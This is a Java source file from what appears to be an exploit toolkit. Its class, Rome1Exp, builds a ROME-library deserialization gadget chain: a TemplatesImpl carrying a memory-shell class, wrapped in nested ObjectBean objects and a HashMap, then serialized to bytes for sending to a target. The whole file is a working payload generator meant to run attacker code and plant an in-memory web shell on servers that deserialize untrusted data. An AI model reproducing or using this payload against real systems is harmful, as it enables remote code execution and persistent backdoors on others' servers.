package sample.exploit.payload;

import com.rometools.rome.feed.impl.ObjectBean;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import sample.utils.ExpUtils;

import javax.xml.transform.Templates;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.util.HashMap;

public class Rome1Exp {
    public String memShell;
    public Class<?> memShellRunner;

    public Rome1Exp(String memShell){
        this.memShell = memShell;
        this.memShellRunner = ExpUtils.getMemShellRunner(memShell);
    }

    public byte[] exploit() throws Exception {
        TemplatesImpl templates = ExpUtils.getTemplatesImpl(memShell, memShellRunner);
        ObjectBean objectBean = new ObjectBean(Templates.class, templates);
        ObjectBean objectBean2 = new ObjectBean(ObjectBean.class, objectBean);
        HashMap hashMap = ExpUtils.makeMap(objectBean2, "aaa");
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream out = new ObjectOutputStream(byteArrayOutputStream);
        out.writeObject(hashMap);
        out.flush();
        out.close();
        return byteArrayOutputStream.toByteArray();
    }
}
